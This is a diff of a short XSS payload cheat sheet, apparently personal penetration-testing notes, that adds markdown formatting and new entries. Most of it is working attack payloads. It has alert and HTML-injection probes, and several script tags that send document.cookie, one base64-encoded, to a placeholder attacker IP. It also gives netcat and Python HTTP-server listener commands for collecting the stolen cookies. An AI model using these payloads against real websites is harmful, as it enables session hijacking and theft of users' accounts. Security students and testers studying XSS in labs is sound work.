@@ -1,5 +1,8 @@
-XSS Payloads
+# XSS Payloads
 
+Vulnerable parametrs can be all that we can modify in BurpSuite from User-Agent to specific parametrs as username,password
+
+```html
 <script>alert(window.origin)</script> 	Basic XSS Payload
 
 <plaintext> 	Basic XSS Payload
@@ -23,16 +26,24 @@ XSS Payloads
 <script>new Image().src='http://YOUR_IP/index.php?c='+document.cookie</script> 	Send Cookie details to us
 
 
-Stealing cookie
 <script src="http://your_ip/xss.js"> // where xss.js file have payload that is below 
 document.write('<img src="http://your_ip/?'+document.cookie+'">'); //into file
 python3 -m http.server 80 // on your machine or 
 nc -lvnp 80
 
+
 HTML payload
 "><u>test123 // for testing output test123
 test123"><img src=x onerror=alert(10)>
 <u/onmouseover=alert(1)>test123
+
+<script>var i=new Image(); i.src="http://my_ip:5000/?cookie="+btoa(document.cookie);</script> // we can steal cookie when website is runned in same port as ->
+python3 -m http.server 5000 // so we take cookie in base64
+```
+
+
+
+
 
 
 
